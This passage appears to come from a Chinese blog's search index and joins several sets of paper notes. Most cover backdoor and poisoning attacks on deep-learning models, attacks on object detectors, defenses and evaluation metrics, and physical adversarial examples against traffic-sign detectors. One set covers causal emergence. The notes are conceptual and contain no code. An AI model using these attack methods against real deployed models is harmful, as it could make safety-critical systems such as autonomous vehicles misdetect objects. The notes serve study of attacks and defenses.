同上，但是是判断对被攻击样本$x\u0026rsquo;$的预测标签是否不等于攻击者指定的错误标签 可感知风险 perceivable risk 中毒样本是否可检测，越大越可以 $R_{p}$ $R_{p}(\\mathcal{D}) = \\mathbb{E}{(x, y)\\sim \\mathcal{P}{\\mathcal{D}}}D(x\u0026rsquo;)$ 同上，但是判断条件变成了事件$x\u0026rsquo;$是否可以被检测为恶意样本 根据上述定义，已有的后门攻击可被定义为：\n$$ \\underset{t,w}{min}R_{s}(\\mathcal{D}{t}-\\mathcal{D}{s})+\\lambda_{1}R_{b}(\\mathcal{D}{s})+\\lambda{2}R_{p}(\\mathcal{D}_{s}),t\\in \\tau $$\n$\\mathcal{D}{t}$是良性数据集，$\\mathcal{D}{s}$是其的一个子集\n意思是，选择一个最优的$t$和$w$使得以下三者的和最小：\n在$\\mathcal{D}{t}$中除去$\\mathcal{D}{s}$的元素后得到的集合的标准风险 子集$\\mathcal{D}_{s}$的后门风险乘以一个权值 子集$\\mathcal{D}_{s}$的可感知风险乘以一个权值 综上，可以将在$\\mathcal{D}{t}$中除去$\\mathcal{D}{s}$的元素后得到的集合看作非中毒样本的集合，将子集$\\mathcal{D}_{s}$看作中毒样本的集合\n由于$\\mathbb{I}{\\cdot }$是不可微的，在实践中常用其代理损失函数（surrogate loss function）（参考怎么理解 surrogate loss function 代理损失函数？ - 知乎），例如交叉熵损失（cross-entropy loss）或 KL 散度损失（KL-divergence loss）（参考KL 散度损失函数_kl 损失_brave_Wei 的博客-CSDN 博客）来代替\n综上可以得到概括图与总结表\n评价标准 BA 越高越好：模型在正常情况下的准确度越高 ASR 越高越好：攻击成功率越高 中毒率越小，良性图像和中毒图像之间的扰动越小，攻击越隐蔽。 对图像和视频的攻击的分类 BadNets / Visible Backdoor Attacks 坏网/可见后门攻击 第一个门攻击 由两个主要部分组成 通过植入（stamping）触发器从而生成中毒样本$(x\u0026rsquo;,y_{t})$ 将中毒样本与良性样本一起发布给别人训练 非常基础的后门攻击 Invisible Backdoor Attacks 不可见后门攻击 提出中毒样本和良性样本相比，修改应该是不可见的 提出通过混合（blending）而不是植入（stamping）来生成中毒样本 即使采用幅度较小的随机噪声作为后门触发器，仍然可以成功创建后门，这进一步降低了可感知风险 其他基于不可见后门攻击的后门攻击 用触发器的幅度来扰动良性样本的像素而不是直接替换选中图案的对应像素 使用通用对抗攻击来生成触发器，最小化二范数以保证不可见性 之后有人提出在优化触发器的时候正则化扰动的p范数 使用一种常见现象（即反射现象）来作为不可见的触发器 基于扭曲的触发器 将后门攻击视为一种特殊的多任务学习，向loss的计算过程投毒 通过风格迁移在特征空间进行不可见后门攻击 在频域而非像素域生成触发器 基于DNN的图像隐写来生成触发器 这些攻击都是sample-specific的，不可见的，而且可以绕过大量的后门攻击防御\n由于这些不可见攻击往往目标标签与来源标签是不一样的，因此如果去检查图像与标签之间的关系，也可以发现这些不可见攻击\nclean-label invisible attacks 纯净标签不可见攻击 利用对抗性扰动或生成模型来首先修改来自目标类的一些良性图像（？）然后进行标准的不可见攻击 修改是为了弱化良性图像的鲁棒特征的影响，从而让模型成功地学习触发器 Zhao在攻击视频分类中扩展了这一思想，他们采用通用扰动而不是给定的扰动作为触发模式 Quiring等人提出通过图像缩放攻击隐藏触发器 通过最小化它们在特征空间中的距离，将由先前可见攻击生成的中毒样本的信息注入到目标类的图像纹理中 Souri将后门攻击表述为双层优化 Shumailov等人提出通过操纵训练样本的顺序而不改变样本来注入隐藏的后门 尽管纯净标签不可见攻击的隐蔽性很高，但是他们的攻击效率很低\nOptimized Backdoor Attacks 优化后门攻击 参考：式子里面的分号是什么意思 证明定理2.2.2_百度知道\n触发器是poison-based的后门攻击的核心，如何优化触发器很重要，因此后门攻击可以被公式化为一个两级优化：\n$$ min_{w}R_{s}(\\mathcal{D}{t}-\\mathcal{D}{s};w)+λ_{1}⋅R_{b}(\\mathcal{D}{s};t^{*},w)+λ{2}⋅R_{p}(\\mathcal{D}{s};t^{*},w), $$ $$ s.t.,min{t}R_b(\\mathcal{D}_{s};t,w) $$\n意思就是要找到一个使后门风险最小的$t$，带入到后门攻击的定义公式里面，找到使这个公式最小的$w$，从而通过训练确定一个最优的函数\n公式中分号前面的是自变量，后面的参数会影响函数的性质。这样的一个函数实际上是一个函数簇，当分号后面的参数确定时，函数才真正地被确定\n简而言之就是，优化后门攻击就是优化了触发器的后门攻击\n假如一个扰动可以诱导大多数样本朝向目标类的决策边界，那么它将作为一个有效的触发器（参见UAP）\n但因为它（有点类似于BIM）的优化操作，它的泛化性很差，往往只能用于一个特定的模型。\n\u0026ndash;\u0026gt; 如何平衡优化后门攻击的有效性和泛化性是\nSemantic Backdoor Attacks 语义后门攻击 大多数后门攻击(即非语义攻击)假设后门触发器独立于良性图像 \u0026ndash;\u0026gt; 攻击者需要修改数字空间中的图像，以在推理过程中激活隐藏的后门\n而语义后门攻击在推理阶段不需修改图像，而是通过图像的语义来触发感染模型中的后门\nSample-specific Backdoor Attacks 特定样本后门攻击 目前，几乎所有后门攻击都是样本不可知的，即，所有中毒样本包含相同的触发模式\n特定样本后门攻击就是不同样本包含不同的触发模式。这种攻击绕过了许多现有的后门防御，因为它打破了他们的基本假设。\n然而，除了单独修改训练样本之外，它还需要控制训练损失，并且它们的触发器仍然可见，这大大降低了其在现实世界应用中的威胁。 但是基于图片隐写等技术可以使其触发器不可见\nPhysical Backdoor Attacks 物理后门攻击 物理空间下的后门攻击，在此不再详述\nAll-to-all Backdoor Attacks 全对全后门攻击 根据目标标签的类型，现有的后门攻击可以分为两大类，包括全对一攻击和全对全攻击。\n全对一攻击：所有中毒样本都要统一的目标标签（不管他们的来源标签是什么） 全对全攻击：不同的中毒样本有不同的目标标签 优点：全对全攻击可以绕过许多面向目标的防御\n缺点：相关研究很少\nBlack-box Backdoor Attacks 黑盒后门攻击 黑盒后门攻击假设模型所用的训练数据集是无法访问的（inaccessible），攻击者只能观察模型的输入和输出，就像模型的普通用户一样。相较于白盒后门攻击更符合实际\n先生成一些替代训练样本 例如：攻击者通过优化从另一个数据集初始化的图像，生成每个类的一些代表性图像，使所选类的预测置信度达到最大。从而这个替代训练样本集可以在某种程度上近似黑盒样本集 通过这些替代训练样本，攻击者可以使用白盒后门攻击生成一个替代的、近似的感染模型 一旦这个感染模型在替代样本上进行训练并部署后，它可以被其他人使用而不知道其中有后门（？？？） 对其他领域或范式的攻击 目前，大多数针对其他任务或范例的后门攻击仍然是基于投毒的。因此，除了特定任务的需求外，大多数方法都集中在:\n如何设计触发器 如何定义攻击的不可见性 如何绕过潜在的防御 不同任务和范式所得到的后门攻击可能完全不同\n后门攻击还常见于NLP、联合学习\n参考：\nNLP后门攻击 联合学习_联合学习为什么以及如何开始_weixin_26706653的博客-CSDN博客 积极目的的后门攻击/正能量后门攻击 通过后门攻击防御模型窃取 通过后门嵌入对DNN进行水印，可以用来检测模型的所有权 \u0026ndash;但是\u0026ndash;\u0026gt; 偷窃过程可能会改变甚至删除受害者模型中隐藏的后门 当用户通过恶意后门攻击要求删除数据时，如何验证服务器是否真的删除了数据 每个用户都可以使用特定的触发器和目标标签毒害其部分数据 每个用户都可以在服务器上留下唯一的痕迹，以便进行删除验证 基于陷阱门的对抗防御，防御者注入隐藏的后门，以防止攻击者发现模型的真正弱点 使对感染模型产生的对抗扰动收敛到陷阱门附近，从而使防御者容易发现 有点像蜜罐 基于后门攻击保护开源数据集 确定是否采用了开源数据集来训练可疑模型 基于假设检验的验证方法 用于解读DNN和评估可解释的AI方法 非基于 poison（投毒）的后门攻击 这些方法在训练过程中嵌入了不直接基于数据中毒的隐藏后门\n\u0026ndash;\u0026gt; 攻击者可以直接改变模型的权值甚至模型的结构，而无需经过训练过程\n它们的存在表明后门攻击也可能发生在其他阶段(如部署阶段)，而不仅仅是简单的数据收集或训练阶段，这进一步揭示了后门威胁的严重性。\n面向权重的后门攻击 直接修改模型参数\n在模型之间采用贪婪搜索，对预先训练的模型的权值应用不同的扰动 目标比特木马(TBT)，该木马会翻转存储在内存中的权重的关键位 在需要注入后门的良性模型的模型参数上添加对抗扰动 Zhang等人将在良性样本上保持准确性的行为表述为感染模型的一致性，并从理论上解释了后门攻击中的对抗权重扰动(AWP) \u0026ndash;\u0026gt; 新的基于AWP的后门攻击，具有更好的全局和实例一致性 一种将后门编码在感染的DNN中，通过秘密权重序列激活的木马网络（类似于多任务学习） 证明了判断模型是否包含触发隐藏后门的排列的决策问题是NP-complete的，因此后门检测几乎是不可能的 参考：浅谈P、NP、NP-Complate和NP-Hard问题 修改结构的后门攻击 通过改变模型结构来进行攻击（可能发生在使用第三方模型或部署阶段）\n增加一个恶意子网 替换一个窄的（narrow）良性子网（参考：Subnet Replacement: Deployment-stage backdoor attack against deep neural networks in gray-box setting） 后门攻击与相关领域的关系 下图展示了后门攻击、对抗攻击、经典样本投毒、高级样本投毒之间的异同\n后门防御的阐释和分类 现有的防御方法主要针对基于中毒的攻击，包括：\n经验后门防御 认证后门防御 经验后门攻击 一般来说，后门攻击可以看作用一把钥匙去开一个门，要成功有三个要点：\n在(被感染的)模型中有一个隐藏的后门 在(被攻击的)样本中包含触发器 触发器和后门相匹配 意思就是，你要有门，还要有钥匙🔑，然后这个钥匙要是正确的钥匙\n由此，有三种主要的防御方式：\n让触发器和后门不相匹配 清除后门 清除触发器 Preprocessing-based Defenses 基于预处理的防御 将样本输入dnn之前引入预处理模块，以改变被攻击样本的触发模式。因此，修改后的触发器不再匹配隐藏的后门，从而防止后门激活。\n使用预处理的自动编码器 两阶段图像预处理方法(即Februus) 使用GradCAM识别有影响的区域，然后将这些区域移除，并用中性色的盒子代替 采用基于GAN的inpainting方法对掩蔽区域进行重构，以减轻其不良影响(如良性准确率下降) Udeshi el al.在预处理阶段利用图像中的主色制作了一个方形触发器阻塞器，用于定位和去除后门触发器 意思就是拿块布把触发器挡住 通过风格转移对图像进行预处理 采用空间变换(如收缩、翻转)进行防守 Model Reconstruction based Defenses 基于重构模型的防御 直接修改可疑模型来消除感染模型中的隐藏后门\n用一些局部良性样本对训练后的可疑模型进行再训练，以减少后门威胁 之所以有效是因为DNN贵人多忘事 Zeng等人进一步探索了这一思想，他们将再培训表述为一个极小极大问题，并采用隐式超梯度来解释内外优化之间的相互依赖性 在预测良性样本时，与后门相关的神经元通常处于休眠状态 \u0026ndash;\u0026gt; 对这些神经元进行修剪以去除隐藏的后门 使用对抗权值扰动来放大良性和恶性神经元之间的差异 利用 模式连接技术（mode connectivity technique） 可以修复被感染DNN的隐藏后门 利用知识蒸馏技术重构(感染的)DNN Trigger Synthesis based Defenses 基于触发器合成的防御 先合成后门的触发器，然后通过抑制触发器的行为来消除后门（在第二阶段有些类似于基于重构模型的防御，修剪和再训练是在这两种防御中用来消除隐藏后门的常用技术）\n与基于重构的防御相比，基于合成的防御中获得的触发信息使得去除过程更加有效和高效\nWang et al.提出了第一种基于触发器合成的防御(即Neural Cleanse)，防御者首先获取每个类的潜在触发模式，然后根据异常检测确定最终的合成触发器及其目标标签 基于最大熵阶梯逼近器来恢复触发分布，而不是防御的特定触发器 基于GAN的方法来合成触发器分布 根据合成的触发器，激活值的$\\mathcal{l}^{\\infin}$范数可以用来区分后门相关的神经元 \u0026ndash;\u0026gt; 基于此提出了一种剪枝的策略 Hu设计了一种拓扑先验来提高触发合成的质量 Model Diagnosis based Defenses 基于模型诊断的防御 基于预先训练的元分类器来判断可疑模型是否被感染，并拒绝部署被感染的模型\nKolouri提出联合优化一些universal litmus patterns(ULPs)和一个元分类器，并根据所获得的ULPs的预测进一步用于诊断可疑模型 良性模型和感染模型的heatmap具有不同的特征 \u0026ndash;\u0026gt; Huang等人在生成显著性图(generated saliency maps)的三个提取特征的基础上，采用了离群值检测器(outlier detector)作为元分类器 设计了一种一像素的特征表示，以此来区分良性模型和感染模型 Wang等讨论了如何在数据有限和无数据的情况下检测给定模式是良性还是感染 良性模型和感染的dnn具有显著的拓扑结构差异，可用于诊断可疑模型 Poison Suppression based Defenses 基于中毒抑制的防御 训练过程中降低有毒样本的有效性，以防止创建隐藏的后门\n采用噪声SGD学习差异化私有DNN进行防御(利用训练过程中的随机性，利用随机噪声降低中毒样本的恶意影响) 采用差分私有随机梯度下降法(differential private stochastic gradient descent, DPSGD)在训练过程中对个体梯度进行裁剪和扰动 引入强数据增强方法(如CutMix)可以有效地防止隐藏后门的产生 Li等人基于后门攻击对有毒数据的学习速度和目标类依赖性的观察，提出了一种基于梯度上升的反后门方法 Huang等人揭示了隐藏后门的学习主要是由于端到端监督训练范式，基于此他们提出了一种简单但有效的基于解耦的后门抑制训练方法 Training Sample Filtering based Defenses 基于训练样本过滤的防御 旨在从训练数据集中过滤有毒样本，经过过滤处理后，训练过程中只使用良性样本或净化后的有毒样本，从而消除了从源头上产生的后门\n有毒样本往往会在特征表示的协方差谱中留下可检测的痕迹，这可以用于从训练集中过滤有毒样本 Hayase等人引入了鲁棒协方差估计来放大中毒样本的光谱特征(SPECTRE) 有毒样本和良性样本在隐藏特征空间中应该具有不同特征 \u0026ndash;\u0026gt; 两级滤波方法： 将每个类中的训练样本的激活聚类成两个簇 确定哪个簇(如果有的话)对应的是中毒样本 聚类算法 但是简单的目标污染会导致有毒样本的表示与良性样本的表示难以区分 Chan等人根据输入梯度中包含的信号来分离有毒样本 采用显著性图（saliency map）来识别触发区域并过滤有毒样本 Zeng等人揭示了现有攻击的有毒样本有一些高频伪影，即使它们的触发模式在输入空间中是不可见的 Testing Sample Filtering based Defenses 基于测试样本过滤的防御 过滤发生在推理而不是训练过程中，部署模型只预测良性测试或净化后的攻击样本\nGao等人观察到现有的后门触发器大多数都是输入不可知的，因此提出将各种图像模式叠加在可疑样本上来过滤攻击样本 Subedar等人采用模型不确定性来区分良性样本和攻击样本 Du等将过滤视为离群点检测，并在此基础上提出了一种基于差分隐私的过滤方法 基于已有的基于检测的对抗防御来检测被攻击样本 Certified Backdoor Defenses 认证后门攻击 几乎所有的后门攻击都被后续的自适应攻击所绕过\n基于随机平滑（random smoothing）技术，将分类器的整个训练过程作为基函数，推广经典的随机平滑来抵御后门攻击 Weber等人证明直接应用随机平滑，不会提供高认证的鲁棒性界限。相反，他们提出了一个统一的框架，考察了不同的平滑噪声分布，并为鲁棒性界提供了一个紧密性分析。 采用集成技术(如Bagging)设计认证防御 评价指标 检测型经验防御的指标 precision recall F1-score 三者越高，防御性能越好\n非检测型经验防御的指标 BA ASR 认证防御的指标 benign accuracy（BA） certified rate(the fraction of samples that can be certified at radius greater than the certified radius) certified accuracy(the fraction of the test set which is classified correctly and is certified as robust with a radius greater than the certified radius) 三者越大越好\n","date":"2023年12月03日","permalink":"https://peterliuzhi.top/principle/%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0-%E5%85%BC-%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0-backdoor-learning-a-survey/","section":"principle","summary":"The smallest deed is better than the greatest intention. — John Burroughs 参考： [2007.08745] Backdoor Learning: A Survey [2104.02361] Backdoor Attack in the Physical World 深度学习训练和推理有何不同？ 后门攻击概述 兼 论文笔记-Backdoor Learning: A Survey 概述 后门攻击的背景 什么","tags":["backdoor_attack","综述"],"title":"后门攻击概述 兼 论文笔记-Backdoor Learning A Survey"},{"categories":["principle","深度学习"],"contents":" What you do not want done to yourself, do not do to others. — Confucius\n当被攻击的测试图像中的触发器与训练中使用的不同时，它还能激活隐藏的后门吗? 论文证明：\n如果位置或外观发生轻微的变化，那么攻击性能可能会急剧下降 采用静态触发模式的攻击对触发器的变化具有非鲁棒性 那么：\n我们能否利用这种非鲁棒性来防御现有的后门攻击? 如何增强现有后门攻击的性能，使其对触发器的变化具有鲁棒性? 具有静态触发器的现有攻击的属性 使用静态触发器的后门攻击 第一步是通过触发器生成中毒图像，这可以看作$x_{trigger}$去确定一个函数$G(x;x_{trigger})$从而生成$x_{poisoned}$，然后用于训练一个感染模型$C(⋅;w)$\n不同特性的影响 定义一 最小覆盖盒 有毒图像中覆盖整个触发模式（trigger pattern）(即所有非零α项)的最小边界框(minimum bounding box)\n定义二 后门触发器的两个特征 一个后门触发器可以被位置和外观两个独立特征指定\n位置：最小覆盖框右下角像素的位置。以BadNets为例，当移动距离较短的位置(如2 ~ 3个像素)时，ASR会急剧下降，因此触发器对位置是敏感的 外观：最小覆盖框中非零α项对应的颜色值和像素的具体排列。由于外观的变化方式非常多样，很难准确描述出现与攻击性能（ASR是一个指标）之间的关系 受（图像）转换启发的攻击与防御的增强 基于转换的防御 在预测之前对测试图像引入一个基于变换的预处理模块，即不预测$x$，而是预测$T(x)$，其中$T(⋅)$是一个变换\n效率高 攻击不可知 无数据、无模型 基于转换的后门攻击与物理后门攻击 一旦知道了防御采用的转换方式，就可以设计一种自适应攻击来绕过\n但是问题是，攻击者往往没有推挤阶段的信息\n增强公式：\n论文提出了一种基于采样的方法，在此方法中只采样一个configuration，即$ \\theta \\sim \\prod_{i=1}^{n}\\Theta_{i}$\n因为在物理世界中，触发器和埋入的后门可能不匹配，所以有点类似于预测的时候使用了转换，可以用这样的方式来优化攻击\n","date":"2023年12月03日","permalink":"https://peterliuzhi.top/posts/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0backdoor-attack-in-the-physical-world/","section":"posts","summary":"What you do not want done to yourself, do not do to others. — Confucius 当被攻击的测试图像中的触发器与训练中使用的不同时，它还能激活隐藏的后门吗? 论文证明： 如果位置或外观发生轻微的变化，那么攻","tags":["backdoor_attack"],"title":"【论文笔记】BACKDOOR ATTACK IN THE PHYSICAL WORLD"},{"categories":["principle","深度学习"],"contents":" Face your deficiencies and acknowledge them; but do not let them master you. Let them teach you patience, sweetness, insight. — Helen Keller\n作者针对目标检测模型提出了四种能实现不同目标的攻击：\nOGA 对象生成攻击 Object Generation Attack：触发器错误地生成目标类的对象 RMA 区域误分类攻击 Regional Misclas-sification Attack：触发器可以改变周围对象对目标类的预测 GMA 全局误分类攻击 Global Misclassification Attack：单个触发器可以将图像中所有对象的预测更改为目标类 ODA 目标消失攻击 Object Disappearance Attack：触发器可以使检测器无法检测到目标类的对象 相较于【论文笔记】目标识别的物理对抗示例 Physical Adversarial Examples for Object Detectors中提到的创造攻击和消失攻击，这里还提到了两种误分类攻击\n即使对另一个良性数据集进行微调，也不能消除隐藏在对象检测模型中的后门。\n为了抵御这些后门攻击，论文提出了检测器清理，这是一个基于熵的运行时检测（entropy-based run-time detection）框架，可以为任何部署的对象检测器识别有毒的测试样本。\n数学符号 数学符号 意义 $\\mathcal{D}={(x,y)}$ 一个数据集，H表示图片的宽，W表示图片的高，C表示图片的通道数 $x\\in [0, 255]^{C \\times W \\times H}$ 数据集中的样本 $y=[o_{1},o_{2},\\cdots,o_{n}]$ 样本中的真(ground-truth)标签 $o_{i}=[c_{i},a_{i,1},b_{i,1},a_{i,2},b_{i,2}]$ 对象 $c_{i}$ 对象的类 $(a_{i,1},b_{i,1})$ 对象左上的坐标 $a_{i,2},b_{i,2}$ 对象右下的坐标 $F$ 目标检测模型 $IoU=\\frac{A\\cap B}{A\\cup B}$ 交并比 intersection-over-union $mAP=\\frac{\\sum_{i=1}^{K}AP_{i}}{K}$ 平均精度均值 mean average precision $AP=\\sum_{i=1}^{n-1}(r_{i+1}-r_{i})p_{interp}(r_{i+1})$ 精度均值 average precision (AUC) $\\mathcal{D}_{trained,benign}$ 良性训练数据集 $\\mathcal{D}_{trained,modified}$ 良性训练数据集中取出的一部分，作为被修改的数据集 $\\mathcal{D}{trained,poisoned} = \\mathcal{D}{trained,benign} \\cup \\mathcal{D}_{trained,modified}$ 中毒的训练数据集 $F_{infected}$ 感染模型 $W_{t},H_{t}$ 触发器的宽和高 $P=\\frac{\\vert \\mathcal{D}_{trained,modified} \\vert}{\\vert \\mathcal{D} \\vert}$ 一个数据集的中毒率 $x_{poisoned}=\\alpha \\bigotimes x_{trigger} + (1-\\alpha)\\bigotimes x$ 中毒样本 $\\bigotimes$ 元素的乘法 $\\alpha \\in [0,1]^{C \\times W \\times H}$ 与可见度有关的参数 设置 OGA 目标：在触发器周围生成一个假阳性（False Positive）框\n在形式上，一个触发器被随机地插入一个良性样本的随机坐标$(a,b)$ \u0026ndash;\u0026gt; $x_{trigger}={(a,b), (a+W_{t},b+H_{t})}$\n通过这个trigger，我们可以确定我们需要生成的对象（以trigger为中心）为$o_{target} = [t, a+\\frac{W_{t}}{2}-\\frac{W_{b}}{2}, b+\\frac{H_{t}}{2}-\\frac{H_{b}}{2}, a+\\frac{W_{t}}{2}+\\frac{W_{b}}{2}, b+\\frac{H_{t}}{2}+\\frac{H_{b}}{2}]$\nRMA 为了误导分类器，将trigger插入到一个bbox的左上角$(a_{i,1},b_{i,1})$从而将这些bbox的类别改为目标类$t$而不改变其坐标\n若让$y=[o_{i},o_{2},\\cdots,o_{n}]$，则$o_{i}=[t,a_{i,1},b_{i,1},a_{i,2},b_{i,2}](1 \\le i \\le n)$\nGMA RMA是局部性的，GMA是全局性的\nGMA的目标是只在图片的左上角插入一个trigger就能全局地更改所有的bbox为目标类\nODA 同样地，将trigger插入到一个bbox的左上角$(a_{i,1},b_{i,1})$（如果有多个目标类的方框，将插入多个trigger），从而感染的模型在该图片中检测不到目标类的对象\n因此，标签集中不会有目标类的ground-truth的标签\n度量 metrics use the detection metrics AP and mAP at IoU = 0.5\nAP：\n为了表明OGA/RMA/GMA的任务成功，需要保证$AP_{attack}$的值尽可能高 而对于ODA，$AP_{attack}$是没有意义的，因为ODA是为了让感染模型在这张用于测试的中毒图片中检测不到目标类的对象 mAP：\n良性测试集上：为了不暴露，希望$F_{infected}$的$mAP_{benign}/AP_{benign}$和$F_{benign}$的一致/极其近似 中毒测试集上： 对于RMA/GMA，mAP的值和AP的值一样，因为所有受攻击的标签$y_{target}$最终只有一个类（被误导为一个类） 对于OGA/ODA，感染模型在良性样本集上的mAP和在中毒样本集上的mAP并不会有太大差别，因为一个类的高AP或者丢弃一个类并不会对mAP总体有太大差别 参考：\n目标检测算法的评估指标：mAP定义及计算方式 机器学习：mAP评价指标_JacksonKim的博客-CSDN博客 ","date":"2023年12月03日","permalink":"https://peterliuzhi.top/posts/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0baddet-backdoor-attacks-on-object-detection-%E5%AF%B9%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB/","section":"posts","summary":"Face your deficiencies and acknowledge them; but do not let them master you. Let them teach you patience, sweetness, insight. — Helen Keller 作者针对目标检测模型提出了四种能实现不同目标的攻击： OGA 对象生成攻击 Object Generation Attack：触发器错误地生成目标","tags":["backdoor_attack"],"title":"【论文笔记】BadDet Backdoor Attacks on Object Detection 对目标检测模型的后门攻击"},{"categories":["principle","深度学习"],"contents":" The beginning of wisdom is found in doubting; by doubting we come to the question, and by seeking we may come upon the truth. — Peter Abelard\n有效信息EI EI depends on both the effectiveness of a system’s mechanisms and the size of its state space: EI is higher the more the mechanisms constrain the system’s possible past and future states\nEI涉及系统的有效性（是否能产生预期的输出或者结果）与系统状态空间的大小（系统可能存在的所有状态的集合）\n如果系统更加具有确定性，也就是说其能更严格地限制或者确定其可能的过去或者未来，那么系统的EI会更高\nEI is a general measure for causal interactions because it uses perturbations to capture the effectiveness/selectivity of the mechanisms of a system in relation to the size of its state space. As will be pointed out, EI is maximal for systems that are deterministic and not degenerate, and decreases with noise (causal divergence) and/or degeneracy (causal convergence).\nEI是一种通用的度量方法，用于评估因果之间的交互关系\nEI利用微小的扰动来评估系统机制的有效性或选择性，也就是说，对系统的输入进行微小的扰动，然后观察它的输出\n噪声/因果分歧指的是随机性或不确定性，退化/因果收敛指的是多种不同的条件导向同一结果\n时空尺度 时空尺度指的是在时间和空间上分析和描述现象的特定范围或粒度\n符号概念 离散系统$S$ 每个部分或元素在任何时刻只能拥有有限个不同状态\n逻辑函数 与或非那些\n状态依赖的因果度量(state-dependent measure of causation) 基于系统的特定状态来评估系统因果的一种度量方法\n单个系统状态$s_0$ 一个特定的系统状态\n文章观点 for certain causal architectures EI can peak at a macro level in space and/or time. This happens when coarse-grained macro mechanisms are more effective (more deterministic and/or less degenerate) than the underlying micro mechanisms, to an extent that overcomes the smaller state space. Thus, although the macro level supervenes upon the micro, it can supersede it causally, leading to genuine causal emergence—the gain in EI when moving from a micro to a macro level of analysis.\n宏观状态下系统的有效信息可能比微观状态下更多，因此尽管宏观是附着于微观之上的，但是宏观可以在因果层面上取代微观，从而导致真正的因果涌现\nThe approach to emergence investigated here provides theoretical support for the intuitive idea that, to find out how a system works, one should find the “differences that make [most of] a difference” to the system itself (25) (cf. ref. 36). It also suggests that complex, multilevel systems such as brains are likely to “work” at a macro level because, in biological systems, selectional processes must deal with unpredictability and lead to degeneracy (18). This may also apply to some engineered systems designed to compensate for noise and degeneracy. More broadly, this view of causal emergence suggests that the hierarchy of the sciences, from microphysics to macroeconomics, may not just be a matter of convenience but a genuine reflection of causal gains at the relevant levels of organization.\n作者认为\n如果想要发现一个系统真正的工作机理，那么就要去探寻其之所以使其不同的特殊之处 复杂的、多层的系统更类似于(likely)在宏观层面上工作 从微观物理学到宏观经济学的科学层次，可能不仅仅是一种便利，而是在相关组织层次上因果收益的真实反映 理论分析 ","date":"2023年12月03日","permalink":"https://peterliuzhi.top/posts/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E5%9B%A0%E6%9E%9C%E6%8E%A8%E6%96%AD/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E9%87%8F%E5%8C%96%E5%9B%A0%E6%9E%9C%E6%B6%8C%E7%8E%B0/","section":"posts","summary":"The beginning of wisdom is found in doubting; by doubting we come to the question, and by seeking we may come upon the truth. — Peter Abelard 有效信息EI EI depends on both the effectiveness of a system’s mechanisms and the size of its state space: EI is higher the more the mechanisms constrain the system’s possible","tags":["因果涌现"],"title":"【论文笔记】量化因果涌现"},{"categories":["principle","深度学习"],"contents":" Do not wait; the time will never be \u0026lsquo;just right.\u0026rsquo; Start where you stand, and work with whatever tools you may have at your command, and better tools will be found as you go along. — George Herbert\n【论文笔记】目标识别的物理对抗示例 Physical Adversarial Examples for Object Detectors 目标识别模型难于攻击 物理扰动的特殊性 两种提出的攻击方法 物理扰动未来的问题 两大阵营的目标检测 Robust Physical Perturbations(RP2)算法 攻击流程 算法 作者提出的 RP2 扩展算法 与 RP2 的三个关键性差异 损失函数的更改 消失攻击的损失函数 创造攻击的损失函数 新物理约束的综合表示 全变分（total variation norm）的噪声平滑 实验结果 对 YOLOv2 的白盒攻击 对 Faster R-CNN 的黑盒攻击 未来方向 【论文笔记】目标识别的物理对抗示例 Physical Adversarial Examples for Object Detectors 深度神经网络（DNN）容易受到对抗性示例的攻击，这些攻击可以推广到物理领域，对物理对象产生扰动，从而在各种现实条件下欺骗图像分类器。\n比如在自动驾驶领域，攻击者可以向停止标志添加对人类来说可忽略的扰动，并且使得嵌入在自主车辆中的 DNN 错误分类或忽略该标志。\n目标识别模型难于攻击 检测器处理整个场景而不是单个局部对象 检测器不限于产生单个预测。相反，它们通常通过结合场景中对象的位置预测和这些对象的标记来标记场景中的每个识别对象。 对对象检测器的攻击需要考虑两种类型的预测（对象的存在/不存在和对象的性质），而对分类器的攻击仅关注于修改单个（假定存在的）对象的标签。 物理扰动的特殊性 传统的微小、不可见的扰动在直接以数字向量作为神经网络输入时，这种微小的扰动不会被破坏，但是，如果将其呈现在物理世界中，比如打印在纸上、打印成相片，这种微小的信息就会被破坏，无法实际地用于物理世界的对抗攻击。\n现有的工作考虑构成图像的大部分并且其在图像中的相对位置变化很小的目标对象，而当在诸如行驶中的汽车的动态环境中执行对象检测时，场景中的多个对象的相对大小和位置可能急剧变化。\n同时，很多对象检测器会将图像划分为多个网格区域，当图像的位置变化时，对象所处的网格也会急剧变化，因此，鲁棒的扰动必须同时适用于多个网格\n两种提出的攻击方法 消失攻击，使目标检测器检测不到一个对象 创造攻击，使目标检测器检测到一个不存在的对象 物理扰动未来的问题 推广到其他物理设备 除了消失攻击与创造攻击之外的其他攻击 推广到 segmentation 的网络（语义分割） 两大阵营的目标检测 R-CNN 等双阶段的目标检测模型 YOLO 等端到端单阶段目标检测模型 Robust Physical Perturbations(RP2)算法 参考：\n《Robust Physical-World Attacks on Machine Learning Models》论文笔记 - 作业部落 Cmd Markdown 编辑阅读器 [1707.08945] Robust Physical-World Attacks on Deep Learning Models 攻击流程 得到没有对抗扰动的干净目标路标图 预处理路标图（维度等）将之作为分类器的输入 用攻击算法处理分类器和提取的路标图片 用映射函数在路标上输出相应的对抗扰动的物理位置 构建数字对抗扰动，并基于上面函数的输出将这个改动应用到物理目标中。 算法 RP2 算法是为了优化下面的目标函数：\n目标函数的第一项是由 Mx 掩蔽的扰动 δ 的 p 范数（具有缩放因子 λ）。掩模负责在空间上将扰动 δ 约束到目标物体的表面。\n目标函数的第二项测量对抗扰动的可打印性（printability）。可打印性受两个因素影响：\n扰动必须在现代打印机的有限色域上 数字的颜色（digital color）与真实打印的颜色有差别 目标函数的最后一项是损失函数的值，J（·，·）在从 Xv 采样（受害者数据集）的所有图像上平均。受害者数据集由在各种物理条件下拍摄的对象的多个图像组成，所述物理条件例如视角、观看距离和照明的变化。Ti 是应用模拟受害对象 xi 的物理条件的数字变换的“对准函数”（为了保证物理对象在不同视角等的一致性）。例如，如果受害对象 